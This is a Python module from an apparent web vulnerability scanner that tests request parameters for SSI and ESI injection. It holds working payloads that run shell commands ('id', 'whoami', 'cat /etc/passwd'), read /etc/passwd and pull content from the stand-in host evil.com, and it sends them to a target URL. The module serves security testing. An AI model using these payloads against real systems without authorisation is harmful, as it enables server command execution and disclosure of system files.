#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SSI/ESI Injection Module
Server-Side Includes and Edge Side Includes injection.
"""
from config import Colors
from modules.base import BaseModule


class SSIInjectionModule(BaseModule):
    """SSI/ESI injection detection module."""

    name = "SSI/ESI Injection"
    vuln_type = "ssi"
    requires_reflection = True

    SSI_PAYLOADS = [
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="whoami"-->',
        '<!--#echo var="DATE_LOCAL"-->',
        '<!--#include file="/etc/passwd"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#config errmsg="SSI_ERROR"-->',
        '<!--#printenv -->',
    ]

    ESI_PAYLOADS = [
        '<esi:include src="http://evil.com/esi"/>',
        '<esi:try><esi:attempt><esi:include src="http://evil.com"/></esi:attempt></esi:try>',
        '<esi:assign name="x" value="1"/>',
    ]

    def test_url(self, url):
        pass

    def test(self, url, method, param, value):
        """Test for SSI/ESI injection via parameter reflection."""
        self._test_ssi(url, method, param, value)
        self._test_esi(url, method, param, value)

    def _test_ssi(self, url, method, param, value):
        """Test for SSI injection."""
        for payload in self.SSI_PAYLOADS[:4]:
            try:
                if method.upper() == "GET":
                    resp = self.requester.request(url, "GET", data={param: payload})
                else:
                    resp = self.requester.request(url, "POST", data={param: payload})
                if resp and resp.status_code == 200:
                    if "SSI_ERROR" in resp.text or "uid=" in resp.text or "root:" in resp.text:
                        self.engine.add_finding(self._finding(
                            technique="SSI Injection",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.85,
                            param=param,
                            payload=payload,
                            evidence=f"SSI executed: {resp.text[:200]}",
                        ))
                        return
            except Exception:
                pass

    def _test_esi(self, url, method, param, value):
        """Test for ESI injection."""
        for payload in self.ESI_PAYLOADS[:2]:
            try:
                if method.upper() == "GET":
                    resp = self.requester.request(url, "GET", data={param: payload})
                else:
                    resp = self.requester.request(url, "POST", data={param: payload})
                if resp and resp.status_code == 200:
                    if "esi:" in resp.text.lower() or "esi_error" in resp.text.lower():
                        self.engine.add_finding(self._finding(
                            technique="ESI Injection",
                            url=url,
                            severity="HIGH",
                            confidence=0.5,
                            param=param,
                            payload=payload,
                            evidence=f"ESI processed: {resp.text[:200]}",
                        ))
            except Exception:
                pass

    def _finding(self, **kw):
        from core.engine import Finding
        return Finding(**kw)
